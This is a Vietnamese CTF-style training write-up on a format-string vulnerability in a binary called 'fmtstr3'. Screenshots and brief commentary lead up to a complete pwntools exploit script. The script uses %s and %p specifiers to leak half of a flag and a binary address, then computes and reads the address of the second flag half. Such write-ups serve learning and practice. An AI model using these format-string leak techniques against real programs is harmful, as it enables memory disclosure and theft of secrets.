# Kết hợp %p và %s
![image](https://github.com/NTDtrytofullstack/training/assets/130078745/a6d1dbd1-0f21-4947-bb85-d266c2f9a4f8)
- Nhìn vào bài thì ta có thể thấy đc 2 lỗi fmt như sau , cùng vào gdb check xem hướng giải sẽ thực hiện như nào nha.
- ![image](https://github.com/NTDtrytofullstack/training/assets/130078745/a59d77c0-b9a1-455c-bbca-26a4cbd5004c)
- Check xong gdb thì ta có thể thấy flag của chúng ta đc chia thành 2 phần, phần đầu ta có thể sử dụng %s là có thể leak ra đc nhưng phần sau thì có vẻ khó hơn 1 chút. Thì ở đây ta có 1 cách như sau đó chính là ở fmtstr thứ nhất ta sẽ leak ra phần đầu của flag và ở lần fmtstr thứ 2 ta sẽ truyền vào đấy địa chỉ của phần flag còn lại và sau đó ta sẽ xài %s để leak đoạn flag cuối cùng , nhưng mà để có thể leak ra đc địa chỉ flag 2 ta cần leak ra đc địa chỉ của binary , thì ở đây có 1 điều mà ta nên biết địa chỉ save rip sẽ luôn là địa chỉ của binary và nó luôn cố định là vậy (trường hợp này binary tĩnh và ta cũng phải nối sever nữa, nên ko thể tùy tiện search địa chỉ flag2 rồi nhét vào đc :))) ).
![image](https://github.com/NTDtrytofullstack/training/assets/130078745/7cf37504-c953-4f9b-8be7-0aed67c67a0e)
![image](https://github.com/NTDtrytofullstack/training/assets/130078745/6b2b4589-ffa3-4c13-9938-b037e3e180fc)
- ta đã lấy đc flag1 rồi bước tiếp là leak địa chỉ binary , tính địa chỉ base và tìm ra địa chỉ flag2.
- ![image](https://github.com/NTDtrytofullstack/training/assets/130078745/c6d8d0fd-2a24-4ca2-8984-a112d567e9fe)
![image](https://github.com/NTDtrytofullstack/training/assets/130078745/f4c5d6cc-6aff-481c-8360-ad217e3ca485)
-Ta đã lấy đc địa chỉ binary , tiếp theo là nhận nó thôi.
![image](https://github.com/NTDtrytofullstack/training/assets/130078745/f2fd6a8b-a7e6-40e4-8bb4-31d6c77f853e)
![image](https://github.com/NTDtrytofullstack/training/assets/130078745/001c47d7-69d3-49b3-a11b-43b920299928)
![image](https://github.com/NTDtrytofullstack/training/assets/130078745/98202613-2c26-4e9f-b3fc-5bbc43f4b83a)
![image](https://github.com/NTDtrytofullstack/training/assets/130078745/c7215965-89a4-4a26-a39b-869fa222df91)
## Source
```
#!/usr/bin/python3
from pwn import *
exe = ELF('./fmtstr3', checksec=False)

p=process(exe.path)
flag = b''

#gdb.attach(p, gdbscript = '''
#b*get_credential+115
#c
#)
#input()
payload = b'%8$s%17$p'
p.sendlineafter(b'name: ',payload)
p.recvuntil(b'Hello ')
flag+= p.recvuntil(b'0x', drop=True) #nhận đoạn flag và bỏ ko nhận 0x
exe_leak = int(p.recvline()[:-1],16) #nhận đoạn địa chỉ binary
exe.address = exe_leak - 0x14e6
flag2_addr = exe.address + 0x4060 #lấy địa chỉ flag2 trừ cho địa chỉ base là ta có thể tính đc địa chỉ flag2

log.info("Flag 1: " + flag.decode()) #recv nhận kiểu byte còn log.info in ra kiểu char cho nên xài decode để ko bị lỗi
log.info("Exe leak: " + hex(exe_leak))
log.info("Exe base: " + hex(exe.address))
log.info("Flag 2 address: "+ hex(flag2_addr))
payload = b'%13$sAAA' #ở đây ta phải thêm 3 byte A cho đủ 8 byte để khi ta nhập địa chỉ flag2 nó là 1 địa chỉ hợp lệ

payload += p64(flag2_addr)
p.sendlineafter(b'greeting: ',payload)
flag +=p.recvuntil(b'}')
log.info("Flag " + flag.decode())
p.interactive()
```



